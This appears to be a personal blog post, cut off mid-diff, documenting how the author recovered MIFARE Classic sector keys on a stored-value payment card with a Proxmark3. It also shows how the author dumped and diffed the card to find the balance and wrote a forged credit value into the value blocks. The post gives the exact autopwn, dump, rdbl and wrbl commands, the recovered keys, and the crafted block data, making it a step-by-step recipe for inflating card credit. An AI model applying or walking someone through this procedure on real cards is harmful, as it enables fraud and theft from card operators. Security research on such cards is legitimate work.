---
layout: post
title: Money Laundrying
date: 2025-10-12
categories: security
tags: rfid mifare-classic proxmark3 reverse-engineering
hidden: true
sitemap: false
---

It started with a stored-value card and a very simple question: if the official reader can update the balance, what is stopping me from talking to the same card and writing the same kind of bytes?

So I tried to understand how it worked. The plan was simple: read the card, spend a little, read it again, and compare the two dumps until the balance fell out. This is that little investigation, with just enough MIFARE Classic context to make the block reads, writes, and diffs make sense.

The first step was simply asking the Proxmark what kind of tag was in front of it. The important parts here are the UID, the detected card family, and the weak PRNG hint, which usually means the card is a good candidate for the standard MIFARE Classic tooling.

```pm3
[usb] pm3 --> hf search
 🕖  Searching for ISO14443-A tag...
[=] ---------- ISO14443-A Information ----------
[+]  UID: 6C 2F AC 83   ( ONUID, re-used )
[+] ATQA: 00 02
[+]  SAK: 18 [2]
[+] Possible types:
[+]    MIFARE Classic 4K
[=]
[=] Proprietary non iso14443-4 card found
[=] RATS not supported
[+] Prng detection..... weak

[?] Hint: Try `hf mf info`


[+] Valid ISO 14443-A tag found
```

Before looking at the dump, it helps to keep the MIFARE Classic memory layout in mind (for the full details, refer to the [NPX](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf) specs). The card is split into sectors, each sector is split into blocks, and every block is 16 bytes. The keys are not attached to a single block: they belong to a whole sector.

For the dump below, the useful mental model is the MIFARE Classic 1K-style layout:

```plaintext
sector  global blocks  sector-local blocks  notes
------  -------------  -------------------  -----------------------------------------
0       0-3            0-3                  block 0 is the manufacturer block
1       4-7            0-3                  blocks 4-6 are data, block 7 is trailer
2       8-11           0-3                  blocks 8-10 are data, block 11 is trailer
...     ...            ...                  same pattern
15      60-63          0-3                  blocks 60-62 are data, block 63 is trailer
```

MIFARE Classic 4K cards extend this layout with more sectors. The first 32 sectors still have 4 blocks each; the larger sectors after that have 16 blocks each, with the last block of each sector still acting as the trailer. The dump I am looking at here only shows the first 16 sectors, so the simple 4-block-per-sector model is enough for the rest of this post.

So when the dump says `sec 2 | blk 8`, it means global block `8`, which is block `0` inside sector `2`. The last block of the sector is the sector trailer. For sector `2`, that is block `11`.

The sector trailer is special:

```plaintext
bytes 0..5    key A
bytes 6..8    access bits
byte  9       general purpose byte
bytes 10..15  key B
```

The access bits define what key is needed to read or write each block in that sector. In the common simple case, key A can read data blocks and key B can write them, while the trailer itself controls the keys and permissions. That is why the key table printed by `autopwn` shows one key A and one key B per sector trailer block:

```plaintext
Sec 2, trailer block 11:
key A = A49F68AB4733
key B = B4E109EC9C52
```

Those are the keys for the whole sector, not just block `11`. So for this card, any access to blocks `8`, `9`, and `10` depends on the sector `2` keys and the permissions encoded in the sector trailer.

In practice, the key choice comes from the trailer's access bits:

```plaintext
operation                  which key?
-------------------------  ----------------------------------------------------------
read a data block          whichever of key A or key B the access bits allow
write a data block         whichever of key A or key B the access bits allow
change sector permissions  authenticate to the trailer with a key allowed to write it
change key A or key B      write the sector trailer, not the data blocks
```

As a rule of thumb: data lives in the data blocks, permissions and keys live in the trailer. Trailer blocks can be rewritten like any other block, as long as the current access bits allow it. The catch is that once a trailer is overwritten, the new keys and access bits immediately define what can be read or written next, so a bad trailer write can lock you out of the sector with the keys you have.

With that layout in mind, `hf mf info` gives a compact summary of the card and checks whether any obvious default keys work. In this case, sector 0 is readable with the default `FFFFFFFFFFFF` key, which is enough to get started.

```pm3
[usb] pm3 --> hf mf info

[=] --- ISO14443-a Information -----------------------------
[+]  UID: 6C 2F AC 83
[+] ATQA: 00 02
[+]  SAK: 18 [1]

[=] --- Keys Information
[+] loaded 2 user keys
[+] loaded 61 hardcoded keys
[+] Sector 0 key A... FFFFFFFFFFFF
[+] Sector 0 key B... FFFFFFFFFFFF
[+] Backdoor key..... same as key A/B
[+] Block 0.......... 6C2FAC836C980200E08E3D1955102213 | .=.U.\".

[=] --- Fingerprint
[+] n/a

[=] --- Magic Tag Information
[=] <n/a>

[=] --- PRNG Information
[+] Prng....... weak
```

Before touching the card, I took note of the visible balance. This first snapshot is the baseline I want to recover from the binary dump.

{% include figure.html path="assets/img/blog/2025-10-12/1250.png" class="img-fluid centered" zoomable=true caption="Initial credit value: 12.50" %}

The next step was to recover enough sector keys to read the full memory. `autopwn` tries the usual MIFARE Classic attacks and dictionaries, then prints a useful table: one row per sector trailer, with the recovered key A and key B for that sector. It also dumps the card at the end, so this gives me the first binary snapshot of the card at `12.50`.

```pm3
[usb] pm3 --> hf mf autopwn

[!] ⚠️   Known key failed. Can\'t authenticate to block   0 key type A
[!] ⚠️   No known key was supplied, key recovery might fail
[+] loaded 5 user keys
[+] loaded 61 hardcoded keys
[=] Running strategy 1
[=] Running strategy 2
[=] .
[+] Target sector   0 key type A -- found valid key [ FFFFFFFFFFFF ] (used for nested / hardnested attack)
[+] Target sector   0 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   3 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   3 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   4 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   4 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   5 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   5 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   6 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   6 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   7 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   7 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   8 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   8 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   9 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   9 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  10 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  10 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  11 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  11 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  12 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  12 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  13 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  13 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  14 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  14 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  15 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  15 key type B -- found valid key [ FFFFFFFFFFFF ]

[+] Found 1 key candidate
[+] Target block    4 key type A -- found valid key [ A71A0C3102FD ]
[+] Target sector   1 key type A -- found valid key [ A71A0C3102FD ]

[+] Found 1 key candidate
[+] Target block    4 key type B -- found valid key [ B76198135BD9 ]
[+] Target sector   1 key type B -- found valid key [ B76198135BD9 ]

[+] Found 1 key candidate
[+] Target block    8 key type A -- found valid key [ A49F68AB4733 ]
[+] Target sector   2 key type A -- found valid key [ A49F68AB4733 ]

[+] Target block    8 key type B
[-] ⛔ Nested attack failed, trying again (1/6)
[+] Found 1 key candidate
[+] Target block    8 key type B -- found valid key [ B4E109EC9C52 ]
[+] Target sector   2 key type B -- found valid key [ B4E109EC9C52 ]

[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  001 | 007 | A71A0C3102FD | N | B76198135BD9 | N
[+]  002 | 011 | A49F68AB4733 | N | B4E109EC9C52 | N
[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  006 | 027 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+] -----+-----+--------------+---+--------------+----
[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )


[+] Generating binary key file
[+] Found keys have been dumped to `~/hf-mf-6C2FAC83-key.bin`
[=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0
[=] Transferring keys to simulator memory ( ok )
[=] Dumping card content to emulator memory (Cmd Error: 04 can occur)
[=] downloading card content from emulator memory
[+] Saved 1024 bytes to binary file `~/hf-mf-6C2FAC83-dump.bin`
[+] Saved to json file ~/hf-mf-6C2FAC83-dump.json
[=] Autopwn execution time: 9 seconds
```

Then I used the card normally and spent some credit. The visible balance moved from `12.50` to `9.00`, which gives me a clean before/after pair to compare.

{% include figure.html path="assets/img/blog/2025-10-12/0900.png" class="img-fluid centered" zoomable=true caption="Credit value after payment: 9.00" %}

After spending, I dumped the card again with the keys recovered by `autopwn`. This is the second data snapshot: each row is a 16-byte block, with the sector number on the left and the global block number next to it.

```pm3

[usb] pm3 --> hf mf dump
[+] Loaded binary key file `~/hf-mf-6C2FAC83-key.bin`
[=] Reading sector access bits...
[=] .................
[+] Finished reading sector access bits
[=] Dumping all blocks from card...
 🕙 Sector... 15 block... 3 ( ok )
[+] Succeeded in dumping all blocks

[+] time: 11 seconds


[=] -----+-----+-------------------------------------------------+-----------------
[=]  sec | blk | data                                            | ascii
[=] -----+-----+-------------------------------------------------+-----------------
[=]    0 |   0 | 6C 2F AC 83 6C 98 02 00 E0 8E 3D 19 55 10 22 13 | l/..l.....=.U.\".
[=]      |   1 | 7B 00 26 88 26 88 00 00 00 00 00 00 00 00 00 00 | {.&.&...........
[=]      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |   3 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    1 |   4 | 00 00 71 01 00 00 01 01 03 01 00 00 00 00 00 4E | ..q............N
[=]      |   5 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0B | ................
[=]      |   6 | 92 B3 D9 34 00 00 00 00 00 00 00 00 FB 01 00 16 | .4...........
[=]      |   7 | A7 1A 0C 31 02 FD 78 77 88 00 B7 61 98 13 5B D9 | ...1..xw...a..[.
[=]    2 |   8 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........
[=]      |   9 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........
[=]      |  10 | 00 00 00 00 FF FF FF FF 00 00 00 00 0A F5 0A F5 | ..............
[=]      |  11 | A4 9F 68 AB 47 33 08 77 8F 00 B4 E1 09 EC 9C 52 | ..h.G3.w.......R
[=]    3 |  12 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  13 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  14 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  15 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    4 |  16 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  17 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  18 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  19 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    5 |  20 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  23 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    6 |  24 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  25 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  26 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  27 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    7 |  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  29 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  30 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  31 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    8 |  32 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  33 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  34 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  35 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    9 |  36 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  37 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  38 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  39 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   10 |  40 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  41 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  42 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  43 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   11 |  44 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  45 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  46 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  47 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   12 |  48 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  49 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  50 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  51 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   13 |  52 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  53 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  54 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  55 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   14 |  56 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  57 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  58 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  59 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   15 |  60 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  61 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  62 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  63 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=] -----+-----+-------------------------------------------------+-----------------

[+] Saved 1024 bytes to binary file `~/hf-mf-6C2FAC83-dump-001.bin`
[+] Saved to json file ~/hf-mf-6C2FAC83-dump-001.json
```

At this point I had two dumps from the same card at two different balances: one from `autopwn` at `12.50`, and one after spending at `9.00`. The easiest way to find the stored value is to compare them and look for blocks that change in a way that matches the visible balance.

This is the point where the problem becomes relational. A value does not mean much in isolation; it starts to mean something when it changes, or when it is contrasted with another value. Bateson's definition of information as ["a difference that makes a difference"](https://www.goodreads.com/quotes/517599-information-is-a-difference-that-makes-a-difference) fits perfectly here: one dump is just noise, but two dumps, with one known thing changed, start to point at structure.

I used [`ssdp`](https://github.com/fedemengo/ssdp), a small tool I wrote, to diff the two dumps. Since I already knew the format was MIFARE Classic 1K, I passed `--format mf1k`, which tells ssdp to label each block by sector and position, and where the byte layout matches decode it as a MIFARE value block with the stored value directly. Unit size defaults to 4 bytes with that flag, which is just the width of a 32-bit MIFARE value.

```ssdp
#!fields=INT_LE,NOT_LE
> ssdp diff --format mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | cat
Inputs:
  data01: ~/hf-mf-6C2FAC83-dump-0900.bin
  data02: ~/hf-mf-6C2FAC83-dump-1250.bin

Diff blocks:
  MIFARE: sec=sector, blk=block within sector
  [BLOCK] abs=06 (0x06) sec=1 blk=2
  [BLOCK] abs=08 (0x08) sec=2 blk=0
  [BLOCK] abs=09 (0x09) sec=2 blk=1

[BLOCK] abs=06 (0x06) sec=1 blk=2
  [units=4]
    data01: FULL=[92 B3 D9 34] | 00 00 00 00 | 00 00 00 00 | [FB 01 00 16]
    data02: FULL=[C5 59 C6 34] | 00 00 00 00 | 00 00 00 00 | [F9 01 00 04]
    !+00
      data01: RAW=92 B3 D9 34 | INT_LE= 886682514 | INT_BE=2461260084 | NOT_LE=3408284781 | NOT_BE=1833707211 | BIN=00110100110110011011001110010010 | BIN_NOT=11001011001001100100110001101101 | NOT_RAW=6D 4C 26 CB
      data02: RAW=C5 59 C6 34 | INT_LE= 885414341 | INT_BE=3310994996 | NOT_LE=3409552954 | NOT_BE= 983972299 | BIN=00110100110001100101100111000101 | BIN_NOT=11001011001110011010011000111010 | NOT_RAW=3A A6 39 CB
    !+12
      data01: RAW=FB 01 00 16 | INT_LE= 369099259 | INT_BE=4211146774 | NOT_LE=3925868036 | NOT_BE=  83820521 | BIN=00010110000000000000000111111011 | BIN_NOT=11101001111111111111111000000100 | NOT_RAW=04 FE FF E9
      data02: RAW=F9 01 00 04 | INT_LE=  67109369 | INT_BE=4177592324 | NOT_LE=4227857926 | NOT_BE= 117374971 | BIN=00000100000000000000000111111001 | BIN_NOT=11111011111111111111111000000110 | NOT_RAW=06 FE FF FB

[BLOCK] abs=08 (0x08) sec=2 blk=0
  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
  data02: [MIFARE VALUE] value=1250 adr=9 (0x09)
  [units=4]
    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
    data02: FULL=[E2 04 00 00] | [1D FB FF FF] | [E2 04 00 00] | 09 F6 09 F6
    !+00
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF
    !+04
      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
      data02: RAW=1D FB FF FF | INT_LE=4294966045 | INT_BE= 503054335 | NOT_LE=      1250 | NOT_BE=3791912960 | BIN=11111111111111111111101100011101 | BIN_NOT=00000000000000000000010011100010 | NOT_RAW=E2 04 00 00
    !+08
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF

[BLOCK] abs=09 (0x09) sec=2 blk=1
  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
  data02: [MIFARE VALUE] value=1250 adr=9 (0x09)
  [units=4]
    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
    data02: FULL=[E2 04 00 00] | [1D FB FF FF] | [E2 04 00 00] | 09 F6 09 F6
    !+00
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF
    !+04
      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
      data02: RAW=1D FB FF FF | INT_LE=4294966045 | INT_BE= 503054335 | NOT_LE=      1250 | NOT_BE=3791912960 | BIN=11111111111111111111101100011101 | BIN_NOT=00000000000000000000010011100010 | NOT_RAW=E2 04 00 00
    !+08
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF

```

The `[MIFARE VALUE]` annotation does the heavy lifting here: ssdp reads the NXP value-block layout and prints the stored integer directly, no guessing needed. Each unit also shows the raw bytes in multiple encodings (little/big-endian, bitwise-not, bits) inspired by [ImHex](https://imhex.werwolv.net/).

And this is where it gets (almost [trivially](https://trivialityspace.github.io/)) obvious. In blocks `8` and `9`, the little-endian value lines up exactly with the two balances: `9.00` and `12.50`.

```plaintext
dump  blk  sector  sector-block  offset  RAW    INT_LE  NOT_LE
----  ---  ------  ------------  ------  -----  ------  ------
0900  8    2       0             +00     84 03  <900>   64635
1250  8    2       0             +00     E2 04  <1250>  64285
0900  8    2       0             +04     7B FC  64635   <900>
1250  8    2       0             +04     1D FB  64285   <1250>
0900  8    2       0             +08     84 03  <900>   64635
1250  8    2       0             +08     E2 04  <1250>  64285
0900  9    2       1             +00     84 03  <900>   64635
1250  9    2       1             +00     E2 04  <1250>  64285
0900  9    2       1             +04     7B FC  64635   <900>
1250  9    2       1             +04     1D FB  64285   <1250>
0900  9    2       1             +08     84 03  <900>   64635
1250  9    2       1             +08     E2 04  <1250>  64285
```


The credit is written three times: once as the value, once bitwise-inverted as a consistency check, once repeated again. That's the NXP value-block format, three copies so a reader can detect corruption. Block `6` also flips on every transaction but doesn't get a `[MIFARE VALUE]` label, which means it doesn't match the value-block layout. Almost certainly a transaction counter or timestamp. I left it alone.

For the test value I used `B0 0B`, for mature and scientific reasons. Conveniently, it also maps to a `29.92` credit value when interpreted as a little-endian integer:

```ssdp
#!fields=INT_LE,NOT_LE
> ssdp conv b00b 2 --from RAW
BIN    : 1011000000001011
BIN_NOT: 0100111111110100
INT_BE : 45067
INT_LE : 2992
NOT_BE : 20468
NOT_LE : 62543
NOT_RAW: 4F F4
RAW    : B0 0B
```

Before writing anything, I wanted to read the target blocks back directly and keep the relevant sector keys in front of me. From the `autopwn` output, sector `2` uses trailer block `11`, with this key pair:

```pm3
[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  001 | 007 | A71A0C3102FD | N | B76198135BD9 | N
[+]  002 | 011 | A49F68AB4733 | N | B4E109EC9C52 | N
[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  006 | 027 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+] -----+-----+--------------+---+--------------+----
[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )
```

Using key A for sector `2`, I can read blocks `8` and `9` directly and verify that they still contain the `9.00` balance representation:

```pm3
[usb] pm3 --> hf mf rdbl --blk 8 -k A49F68AB4733

[=]   # | sector 02 / 0x02                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]   8 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........

[usb] pm3 --> hf mf rdbl --blk 9 -k A49F68AB4733

[=]   # | sector 02 / 0x02                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]   9 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........
```

The new block value is just the old block with `84 03` (`0900`) replaced by `B0 0B` (`29.92`) and `7B FC` replaced by `4F F4`, the inverted representation:

```python
>>> block = "84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6"
>>> data = block.replace(" ", "")
>>> data = data.replace("8403", "B00B")
>>> data = data.replace("7BFC", "4FF4")
>>> data
'B00B00004FF4FFFFB00B000009F609F6'
```

For this sector, key B is accepted for the write. I wrote the same updated value to both blocks that appeared to hold the balance:

```pm3
[usb] pm3 --> hf mf wrbl --blk 8 -k B4E109EC9C52 -b -d B00B00004FF4FFFFB00B000009F609F6
[=] Writing block no 8, key type:B - B4E109EC9C52
[=] data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
[+] Write ( ok )
[?] Hint: Try `hf mf rdbl` to verify

[usb] pm3 --> hf mf wrbl --blk 9 -k B4E109EC9C52 -b -d B00B00004FF4FFFFB00B000009F609F6
[=] Writing block no 9, key type:B - B4E109EC9C52
[=] data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
[+] Write ( ok )
[?] Hint: Try `hf mf rdbl` to verifyh
```

After writing, I dumped the card again and compared the modified dump against the previous `9.00` dump. The only intended differences should be in blocks `8` and `9`.

```ssdp
#!fields=INT_LE,NOT_LE
> ssdp diff --format mf1k hf-mf-6C2FAC83-dump-xxxx.bin hf-mf-6C2FAC83-dump-0900.bin
Inputs:
  data01: ~/hf-mf-6C2FAC83-dump-0900.bin
  data02: ~/hf-mf-6C2FAC83-dump-xxxx.bin

Diff blocks:
  MIFARE: sec=sector, blk=block within sector
  [BLOCK] abs=08 (0x08) sec=2 blk=0
  [BLOCK] abs=09 (0x09) sec=2 blk=1

[BLOCK] abs=08 (0x08) sec=2 blk=0
  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
  data02: [MIFARE VALUE] value=2992 adr=9 (0x09)
  [units=4]
    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
    data02: FULL=[B0 0B 00 00] | [4F F4 FF FF] | [B0 0B 00 00] | 09 F6 09 F6
    !+00
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF
    !+04
